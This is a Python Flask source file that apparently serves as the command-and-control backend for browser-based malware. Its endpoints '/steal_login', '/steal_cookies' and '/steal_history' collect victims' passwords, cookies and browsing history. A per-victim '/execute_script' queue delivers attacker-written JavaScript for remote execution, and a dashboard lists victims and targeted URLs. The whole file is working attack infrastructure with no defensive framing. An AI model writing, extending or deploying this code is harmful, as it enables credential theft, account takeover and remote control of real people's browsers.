
from flask import Flask, render_template, request, redirect, url_for, jsonify

# Initial Database Dos
import general_db

from pyfiles import users, login, secure, history, cookies, victim

app = Flask(__name__)

executeQueue = {} # Faster than DB

@app.route("/")
def index():
    usrs = users.get_all_users()
    s = {}
    r = {}
    v = {}
    for u in usrs:
        s[str(u)] = secure.getFromSecure(u)
        r[str(u)] = secure.getFromRandom(u)
        v[str(u)] = victim.getFromVictim(u)
    return render_template("index.html", users = usrs, secure_urls = s, random_urls = r, victim_urls = v)

@app.route('/online_check', methods=['POST'])
def online_check(): 
    if request.method == 'POST':
        email = request.form['email']
        users.update_user(email)
        return "thanks for pinging!"

@app.route("/view_user/<email>", methods=['GET'])
def view_user(email):
    hist = history.get_history_by_user(email)
    cook = cookies.get_cookies_by_user(email)
    logs = login.get_logins_by_user(email)
    return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs)

########### SECURE ###########
@app.route('/addSecure/<email>', methods=['POST'])
def add_secure(email):
    if request.method == 'POST':
        url = request.form['url']
        secure.addToSecure(email, url)  
        return redirect(url_for('index'))

@app.route('/deleteSecure/<email>/<url>', methods=['POST'])
def delete_secure(email, url):
    if request.method == 'POST':
        secure.removeFromSecure(email, url)
        return redirect(url_for('index'))

@app.route('/get_secure/<email>', methods=['GET'])
def get_secure(email):
    return jsonify(s=secure.getFromSecure(email))

########### RANDOM ###########
@app.route('/addRandom/<email>', methods=['POST'])
def add_random(email):
    if request.method == 'POST':
        url = request.form['url']
        secure.addToRandom(email, url)
        return redirect(url_for('index'))

@app.route('/deleteRandom/<email>/<url>', methods=['POST'])
def delete_random(email, url):
    if request.method == 'POST':
        secure.removeFromRandom(email, url)
        return redirect(url_for('index'))

@app.route('/get_random/<email>', methods=['GET'])
def get_random(email):
    return jsonify(r=secure.getFromRandom(email))

########### VICTIM ###########
@app.route('/addVictim/<email>', methods=['POST'])
def add_victim(email):
    if request.method == 'POST':
        url = request.form['victim_url']
        script = request.form['execute-script']
        victim.addToVictim(email, script, url)
        return redirect(url_for('index'))

@app.route('/deleteVictim/<email>/<url>/', methods=['POST'])
def delete_victim(email, url):
    if request.method == 'POST':
        victim.removeFromVictim(email, url)
        return redirect(url_for('index'))

@app.route('/get_victim/<email>', methods=['GET'])
def get_victim(email):
    return jsonify(r=victim.getFromVictim(email))


@app.route("/steal_history", methods=['POST'])
def steal_history():
    email = request.form['email']
    if email=="no_email_found":
        email = request.remote_addr
    urls = request.form.getlist('urls[]')
    last_visited = request.form.getlist('last_visits[]')
    history.bulk_add_to_history(email, urls, last_visited)
    return "hi"

@app.route("/steal_login", methods=['POST'])
def steal_login():
    if request.method == 'POST':
        email = request.form['email']
        if email=="no_email_found":
            email = request.remote_addr
        url = request.form['url']
        username = request.form['username']
        password = request.form['password']
        login.add_to_login(email, url, username, password)
        return "we all good here"


@app.route("/steal_cookies", methods=['POST'])
def steal_cookies():
    if request.method == 'POST':
        email = request.form['email']
        if email=="no_email_found":
            email = request.remote_addr
        url = request.form['url']
        cookie = request.form['cookies']
        cookies.bulk_add_to_cookies(email, url, cookie)
        return "WHATS UP dawg?"

@app.route("/execute_script/<email>", methods=['GET', 'POST'])
def execute_script(email):
    if request.method == 'POST':
        script = request.form['script']
        oldList = executeQueue.get(str(email), [])
        oldList.append(str(script))
        executeQueue[str(email)] = oldList
        return redirect(url_for('index'))
    elif request.method == 'GET':
        #print "EMAIL:", str(email)
        #print "EXECUTE:", executeQueue
        script = executeQueue.get(str(email), [])
        #print "SCRIPTS:", script
        if script:
            #print "IN SCRIPT"
            executeQueue[str(email)] = []
            #print executeQueue
            #print script
            return jsonify(js=script)
        else:
            #print "NOT IN SCRIPT"
            return jsonify(js=[])

if __name__ == "__main__":
    # So template reloads when data is changed
    app.config['TEMPLATES_AUTO_RELOAD'] = True

    # uncomment this if you want to erase all tables
    general_db.drop_all_tables()

    # uncomment this if you want to create all tables
    general_db.create_all_tables()

    # uncomment this time if you want to erase the data
    general_db.delete_db()

    app.run(host='0.0.0.0', port=5000, debug=True)
